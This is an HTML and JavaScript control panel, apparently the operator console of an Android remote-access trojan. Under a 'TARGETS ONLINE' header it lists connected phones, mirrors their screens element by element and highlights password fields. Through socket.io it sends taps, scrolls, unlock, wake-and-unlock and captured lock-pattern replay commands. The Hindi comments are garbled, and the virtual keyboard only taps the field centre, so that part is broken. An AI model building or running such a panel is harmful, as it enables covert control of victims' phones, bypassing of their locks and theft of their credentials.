<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Screen Control - Ultimate</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap');
        
        /* ‡§¨‡•á‡§∏‡§ø‡§ï ‡§∏‡•ç‡§ü‡§æ‡§á‡§≤ */
        body { font-family: 'Roboto', sans-serif; background-color: #121212; color: #e0e0e0; margin: 0; padding: 0; height: 100vh; overflow: hidden; }
        .view { display: none; width: 100%; height: 100%; }
        .view.active { display: flex; }

        /* ===== ‡§°‡§ø‡§µ‡§æ‡§á‡§∏ ‡§∏‡•Ç‡§ö‡•Ä ‡§µ‡•ç‡§Ø‡•Ç ===== */
        #device-list-view { flex-direction: column; }
        .header { background-color: #1e1e1e; padding: 20px; text-align: center; border-bottom: 2px solid #ff4500; }
        .header h1 { font-family: 'Orbitron', sans-serif; margin: 0; font-size: 2.5em; color: #ff4500; text-shadow: 0 0 10px #ff4500; }
        #device-list-container { padding: 30px; overflow-y: auto; flex-grow: 1; }
        #device-list { list-style: none; padding: 0; margin: 0; }
        .device { background-color: #1e1e1e; margin-bottom: 15px; border-radius: 8px; border-left: 5px solid #555; padding: 20px; cursor: pointer; transition: all 0.3s ease; display: flex; justify-content: space-between; align-items: center; }
        .device:hover { transform: translateY(-5px); box-shadow: 0 10px 20px rgba(0,0,0,0.2); border-left-color: #ff4500; }
        .device-name { font-size: 1.5em; font-weight: 700; }
        .device-info { font-size: 1em; color: #aaa; }
        .status-dot { height: 15px; width: 15px; background-color: #28a745; border-radius: 50%; display: inline-block; box-shadow: 0 0 8px #28a745; }

        /* ===== ‡§ï‡§Ç‡§ü‡•ç‡§∞‡•ã‡§≤ ‡§µ‡•ç‡§Ø‡•Ç ===== */
        #control-view { flex-direction: column; }
        .control-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background-color: #1e1e1e; border-bottom: 1px solid #333; flex-wrap: wrap; gap: 10px; }
        #back-to-list-btn { background-color: #3f3f46; color: white; border: 1px solid #555; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-size: 1em; }
        #device-title { font-size: 1.2em; font-weight: bold; }
        .main-container { display: flex; flex-grow: 1; }
        .screen-area { flex-grow: 1; display: flex; align-items: center; justify-content: center; padding: 15px; }
        #screen-viewport { border: 8px solid #444; border-radius: 20px; background-color: #000; box-shadow: 0 0 20px rgba(0,0,0,0.5); overflow: hidden; }
        #screen-container { position: relative; background-color: #000; transform-origin: top left; }
        .screen-element { position: absolute; border: 1px solid rgba(0, 255, 255, 0.6); background-color: rgba(0, 139, 139, 0.2); box-sizing: border-box; cursor: pointer; display: flex; align-items: center; justify-content: center; text-align: center; padding: 2px; }
        .element-text { color: white; font-size: 12px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 100%; }
        
        /* ‡§ï‡•Ä‡§¨‡•ã‡§∞‡•ç‡§° ‡§è‡§≤‡§ø‡§Æ‡•á‡§Ç‡§ü ‡§ï‡•á ‡§≤‡§ø‡§è ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§∏‡•ç‡§ü‡§æ‡§á‡§≤ */
        .keyboard-element { border-color: #ff9900 !important; background-color: rgba(255, 153, 0, 0.3) !important; }
        .password-element { border-color: #ff3333 !important; background-color: rgba(255, 51, 51, 0.2) !important; }
        .editable-element { border-color: #33cc33 !important; background-color: rgba(51, 204, 51, 0.2) !important; }
        
        .all-controls { width: 80px; background-color: #1e1e1e; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 12px; padding: 10px; }
        .control-button { width: 55px; height: 55px; background-color: #3f3f46; border: 1px solid #555; color: white; border-radius: 50%; cursor: pointer; font-size: 24px; transition: background-color 0.2s; display: flex; align-items: center; justify-content: center; }
        .control-button:hover { background-color: #555; }
        .divider { height: 1px; width: 80%; background-color: #444; margin: 10px 0; }

        .advanced-controls { display: flex; gap: 10px; }
        .advanced-controls button { background-color: #333; border: 1px solid #555; color: #ccc; padding: 8px 12px; border-radius: 5px; cursor: pointer; }
        .advanced-controls button:hover { background-color: #444; }
        .advanced-controls button:disabled { background-color: #252526; color: #666; cursor: not-allowed; }
        .capture-mode { background-color: #ff4500 !important; color: white !important; box-shadow: 0 0 10px #ff4500; }
        
        /* ‡§®‡§Ø‡§æ ‡§¨‡§ü‡§® ‡§∏‡•ç‡§ü‡§æ‡§á‡§≤ */
        .wake-unlock-btn { background-color: #0066cc !important; color: white !important; border-color: #0099ff !important; }
        .wake-unlock-btn:hover { background-color: #0080ff !important; }
        
        /* ‡§ï‡•Ä‡§¨‡•ã‡§∞‡•ç‡§° ‡§¨‡§ü‡§® ‡§∏‡•ç‡§ü‡§æ‡§á‡§≤ */
        .keyboard-buttons { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); padding: 10px; border-radius: 10px; display: none; }
        .key-row { display: flex; justify-content: center; margin: 5px 0; }
        .key-btn { width: 40px; height: 40px; margin: 2px; background: #333; border: 1px solid #555; color: white; border-radius: 5px; cursor: pointer; }
        .key-btn:hover { background: #444; }
    </style>
</head>
<body>

    <div id="device-list-view" class="view active">
        <div class="header"><h1>TARGETS ONLINE</h1></div>
        <div id="device-list-container"><ul id="device-list"></ul></div>
    </div>

    <div id="control-view" class="view">
        <div class="control-header">
            <button id="back-to-list-btn">‚Üê Back to List</button>
            <h2 id="device-title"></h2>
            <div class="advanced-controls">
                <button id="btn-unlock">üîì Unlock</button>
                <!-- ‡§®‡§Ø‡§æ ‡§¨‡§ü‡§®: Wake & Unlock -->
                <button id="btn-wake-and-unlock" class="wake-unlock-btn">‚èª Wake & Unlock</button>
                <button id="btn-capture-pattern">üé® Capture Pattern</button>
                <button id="btn-apply-pattern" disabled>‚úçÔ∏è Apply Pattern</button>
            </div>
        </div>
        <div class="main-container">
            <div class="screen-area">
                <div id="screen-viewport">
                    <div id="screen-container"></div>
                    <!-- ‡§ï‡•Ä‡§¨‡•ã‡§∞‡•ç‡§° ‡§¨‡§ü‡§® ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ -->
                    <div id="keyboard-buttons" class="keyboard-buttons"></div>
                </div>
            </div>
            <div class="all-controls">
                <button class="control-button" id="btn-scroll-up">‚Üë</button>
                <button class="control-button" id="btn-scroll-left">‚Üê</button>
                <button class="control-button" id="btn-scroll-right">‚Üí</button>
                <button class="control-button" id="btn-scroll-down">‚Üì</button>
                <div class="divider"></div>
                <button class="control-button" id="btn-back">‚Æå</button>
                <button class="control-button" id="btn-home">‚åÇ</button>
                <button class="control-button" id="btn-recents">‚ñ°</button>
            </div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();

        const deviceListView = document.getElementById('device-list-view');
        const controlView = document.getElementById('control-view');
        const deviceListEl = document.getElementById('device-list');
        const screenContainer = document.getElementById('screen-container');
        const screenViewport = document.getElementById('screen-viewport');
        const deviceTitleEl = document.getElementById('device-title');
        const backToListBtn = document.getElementById('back-to-list-btn');
        const unlockBtn = document.getElementById('btn-unlock');
        const wakeUnlockBtn = document.getElementById('btn-wake-and-unlock'); // ‡§®‡§Ø‡§æ ‡§¨‡§ü‡§®
        const capturePatternBtn = document.getElementById('btn-capture-pattern');
        const applyPatternBtn = document.getElementById('btn-apply-pattern');
        const keyboardButtons = document.getElementById('keyboard-buttons');

        let devices = {};
        let activeDeviceId = null;
        let isCaptureMode = false;
        let capturedPattern = [];
        let savedPattern = null;
        let currentKeyboardElement = null;

        function showView(viewId) {
            document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
            document.getElementById(viewId).classList.add('active');
        }

        socket.on('connect', () => socket.emit('admin_join'));
        socket.on('device_list', (initialDevices) => { deviceListEl.innerHTML = ''; devices = {}; initialDevices.forEach(addDeviceToList); });
        socket.on('new_device_joined', addDeviceToList);
        socket.on('device_disconnected', (deviceId) => {
            const el = document.getElementById(`device-${deviceId}`);
            if (el) el.remove();
            delete devices[deviceId];
            if (activeDeviceId === deviceId) {
                showView('device-list-view');
                activeDeviceId = null;
            }
        });

        function addDeviceToList(device) {
            if (document.getElementById(`device-${device.deviceId}`)) {
                const infoEl = document.querySelector(`#device-${device.deviceId} .device-info`);
                if (infoEl) infoEl.textContent = `Battery: ${device.battery}%`;
                return;
            }

            devices[device.deviceId] = device;
            
            const li = document.createElement('li');
            li.className = 'device';
            li.id = `device-${device.deviceId}`;
            li.innerHTML = `
                <div>
                    <div class="device-name">${device.deviceName}</div>
                    <div class="device-info">Battery: ${device.battery}%</div>
                </div>
                <span class="status-dot"></span>
            `;
            li.addEventListener('click', () => {
                activeDeviceId = device.deviceId;
                deviceTitleEl.textContent = `${device.deviceName} - Controlling`;
                screenContainer.innerHTML = 'Waiting for screen data...';
                showView('control-view');
            });
            deviceListEl.appendChild(li);
        }

        socket.on('screen_update', (data) => {
            if (data.deviceId !== activeDeviceId) return;
            window.requestAnimationFrame(() => {
                screenContainer.innerHTML = '';
                const remoteWidth = data.screenWidth, remoteHeight = data.screenHeight;
                const viewportHeight = screenViewport.clientHeight;
                const scale = viewportHeight / remoteHeight;
                screenViewport.style.width = (remoteWidth * scale) + 'px';
                screenContainer.style.width = remoteWidth + 'px';
                screenContainer.style.height = remoteHeight + 'px';
                screenContainer.style.transform = `scale(${scale})`;
                
                // ‡§ï‡•Ä‡§¨‡•ã‡§∞‡•ç‡§° ‡§¨‡§ü‡§®‡•ç‡§∏ ‡§π‡§æ‡§á‡§° ‡§ï‡§∞‡•á‡§Ç
                keyboardButtons.style.display = 'none';
                currentKeyboardElement = null;
                
                data.elements.forEach(element => {
                    const el = document.createElement('div');
                    el.className = 'screen-element';
                    el.style.left = `${element.x}px`; 
                    el.style.top = `${element.y}px`;
                    el.style.width = `${element.width}px`; 
                    el.style.height = `${element.height}px`;
                    
                    // ‡§è‡§≤‡§ø‡§Æ‡•á‡§Ç‡§ü ‡§ü‡§æ‡§á‡§™ ‡§ï‡•á ‡§Ö‡§®‡•Å‡§∏‡§æ‡§∞ ‡§ï‡•ç‡§≤‡§æ‡§∏ ‡§ú‡•ã‡§°‡§º‡•á‡§Ç
                    if (element.isKeyboard) {
                        el.classList.add('keyboard-element');
                    }
                    if (element.isPassword) {
                        el.classList.add('password-element');
                    }
                    if (element.editable) {
                        el.classList.add('editable-element');
                    }
                    
                    const textEl = document.createElement('div');
                    textEl.className = 'element-text';
                    
                    // ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§Ü‡§á‡§ï‡§®
                    if (element.contentDescription) {
                        const desc = element.contentDescription.toLowerCase();
                        if (desc.includes("more options")) { 
                            textEl.textContent = '‚ãÆ'; 
                            textEl.style.fontSize = '20px'; 
                        }
                        else if (desc.includes("navigate up") || desc.includes("drawer")) { 
                            textEl.textContent = '‚â°'; 
                            textEl.style.fontSize = '20px'; 
                        }
                        else if (desc.includes("keyboard") || desc.includes("ime")) {
                            textEl.textContent = '‚å®Ô∏è'; 
                            textEl.style.fontSize = '16px';
                        }
                        else if (element.text) {
                            textEl.textContent = element.text;
                        } else {
                            textEl.textContent = element.contentDescription;
                        }
                    } else if (element.text) {
                        textEl.textContent = element.text;
                    } else if (element.className) {
                        textEl.textContent = element.className.split('.').pop();
                    }
                    
                    el.appendChild(textEl);
                    
                    // ‡§ï‡•ç‡§≤‡§ø‡§ï ‡§á‡§µ‡•á‡§Ç‡§ü
                    el.addEventListener('click', () => {
                        const tapX = Math.round(element.x + (element.width / 2));
                        const tapY = Math.round(element.y + (element.height / 2));
                        
                        if (isCaptureMode) {
                            capturedPattern.push({ x: tapX, y: tapY });
                            el.style.backgroundColor = 'rgba(255, 69, 0, 0.7)';
                        } else {
                            socket.emit('command_to_device', { 
                                deviceId: activeDeviceId, 
                                action: 'touch_command', 
                                payload: { x: tapX, y: tapY } 
                            });
                            
                            // ‡§Ö‡§ó‡§∞ ‡§Ø‡§π ‡§ï‡•Ä‡§¨‡•ã‡§∞‡•ç‡§° ‡§Ø‡§æ ‡§è‡§°‡§ø‡§ü‡•á‡§¨‡§≤ ‡§´‡•Ä‡§≤‡•ç‡§° ‡§π‡•à, ‡§§‡•ã ‡§ï‡•Ä‡§¨‡•ã‡§∞‡•ç‡§° ‡§¶‡§ø‡§ñ‡§æ‡§è‡§Ç
                            if (element.editable || element.isKeyboard) {
                                currentKeyboardElement = element;
                                showVirtualKeyboard(element);
                            }
                        }
                    });
                    
                    screenContainer.appendChild(el);
                });
            });
        });

        // ‡§µ‡§∞‡•ç‡§ö‡•Å‡§Ö‡§≤ ‡§ï‡•Ä‡§¨‡•ã‡§∞‡•ç‡§° ‡§¶‡§ø‡§ñ‡§æ‡§®‡•á ‡§ï‡§æ ‡§´‡§Ç‡§ï‡•ç‡§∂‡§®
        function showVirtualKeyboard(element) {
            keyboardButtons.innerHTML = '';
            keyboardButtons.style.display = 'block';
            
            // ‡§ï‡•Ä‡§¨‡•ã‡§∞‡•ç‡§° ‡§≤‡•á‡§Ü‡§â‡§ü
            const keyboardLayout = [
                ['1','2','3','4','5','6','7','8','9','0'],
                ['q','w','e','r','t','y','u','i','o','p'],
                ['a','s','d','f','g','h','j','k','l'],
                ['z','x','c','v','b','n','m','‚å´'],
                ['space','enter']
            ];
            
            keyboardLayout.forEach(row => {
                const rowDiv = document.createElement('div');
                rowDiv.className = 'key-row';
                
                row.forEach(key => {
                    const keyBtn = document.createElement('button');
                    keyBtn.className = 'key-btn';
                    keyBtn.textContent = key;
                    
                    keyBtn.onclick = () => {
                        if (key === '‚å´') {
                            // ‡§¨‡•à‡§ï‡§∏‡•ç‡§™‡•á‡§∏
                            socket.emit('command_to_device', { 
                                deviceId: activeDeviceId, 
                                action: 'global_action', 
                                payload: { action: 'back' } 
                            });
                        } else if (key === 'space') {
                            // ‡§∏‡•ç‡§™‡•á‡§∏ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ü‡§ö
                            socket.emit('command_to_device', { 
                                deviceId: activeDeviceId, 
                                action: 'touch_command', 
                                payload: { x: Math.round(element.x + element.width/2), y: Math.round(element.y + element.height/2) } 
                            });
                        } else if (key === 'enter') {
                            // ‡§è‡§Ç‡§ü‡§∞ ‡§ï‡•Ä
                            socket.emit('command_to_device', { 
                                deviceId: activeDeviceId, 
                                action: 'touch_command', 
                                payload: { x: Math.round(element.x + element.width/2), y: Math.round(element.y + element.height/2) } 
                            });
                        } else {
                            // ‡§®‡•â‡§∞‡•ç‡§Æ‡§≤ ‡§ï‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§ü‡•á‡§ï‡•ç‡§∏‡•ç‡§ü ‡§´‡•Ä‡§≤‡•ç‡§° ‡§™‡§∞ ‡§ü‡§ö ‡§ï‡§∞‡•á‡§Ç
                            socket.emit('command_to_device', { 
                                deviceId: activeDeviceId, 
                                action: 'touch_command', 
                                payload: { x: Math.round(element.x + element.width/2), y: Math.round(element.y + element.height/2) } 
                            });
                        }
                    };
                    
                    rowDiv.appendChild(keyBtn);
                });
                
                keyboardButtons.appendChild(rowDiv);
            });
        }

        function sendGlobalAction(action) { 
            if (!activeDeviceId) return; 
            socket.emit('command_to_device', { 
                deviceId: activeDeviceId, 
                action: 'global_action', 
                payload: { action: action } 
            }); 
        }
        
        function sendScrollAction(direction) { 
            if (!activeDeviceId) return; 
            socket.emit('command_to_device', { 
                deviceId: activeDeviceId, 
                action: 'scroll_action', 
                payload: { direction: direction } 
            }); 
        }
        
        backToListBtn.onclick = () => { 
            activeDeviceId = null; 
            showView('device-list-view'); 
        };
        
        document.getElementById('btn-back').onclick = () => sendGlobalAction('back');
        document.getElementById('btn-home').onclick = () => sendGlobalAction('home');
        document.getElementById('btn-recents').onclick = () => sendGlobalAction('recents');
        document.getElementById('btn-scroll-up').onclick = () => sendScrollAction('up');
        document.getElementById('btn-scroll-down').onclick = () => sendScrollAction('down');
        document.getElementById('btn-scroll-left').onclick = () => sendScrollAction('left');
        document.getElementById('btn-scroll-right').onclick = () => sendScrollAction('right');

        unlockBtn.onclick = () => { 
            if (!activeDeviceId) return; 
            socket.emit('command_to_device', { 
                deviceId: activeDeviceId, 
                action: 'unlock_device' 
            }); 
        };

        // ‡§®‡§Ø‡§æ: Wake ‡§î‡§∞ Unlock ‡§¨‡§ü‡§®
        wakeUnlockBtn.onclick = () => { 
            if (!activeDeviceId) return; 
            socket.emit('command_to_device', { 
                deviceId: activeDeviceId, 
                action: 'wake_and_unlock' 
            }); 
        };

        capturePatternBtn.onclick = () => {
            isCaptureMode = !isCaptureMode;
            if (isCaptureMode) {
                capturedPattern = [];
                capturePatternBtn.classList.add('capture-mode');
                capturePatternBtn.textContent = 'üíæ Save Pattern';
            } else {
                capturePatternBtn.classList.remove('capture-mode');
                capturePatternBtn.textContent = 'üé® Capture Pattern';
                if (capturedPattern.length > 2) {
                    savedPattern = capturedPattern;
                    applyPatternBtn.disabled = false;
                    alert(`Pattern captured with ${capturedPattern.length} points!`);
                }
                capturedPattern = [];
            }
        };

        applyPatternBtn.onclick = () => {
            if (savedPattern && activeDeviceId) {
                socket.emit('command_to_device', { 
                    deviceId: activeDeviceId, 
                    action: 'apply_pattern', 
                    payload: { pattern: savedPattern } 
                });
            }
        };

        setInterval(() => { 
            if (socket.connected) socket.emit('heartbeat', {}); 
        }, 30000);
    </script>
</body>
</html>
